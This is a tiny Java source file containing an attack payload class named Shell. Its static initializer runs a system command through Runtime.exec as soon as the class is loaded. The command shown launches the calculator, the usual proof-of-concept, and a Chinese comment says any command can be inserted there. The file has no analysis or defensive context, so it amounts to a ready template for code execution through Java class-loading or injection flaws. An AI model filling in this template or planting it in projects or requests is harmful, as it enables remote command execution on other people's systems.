public class Shell{
    static {
        try{
            Runtime.getRuntime().exec("calc");
        }catch (Exception e) {};      // 插入任意命令
   }
}
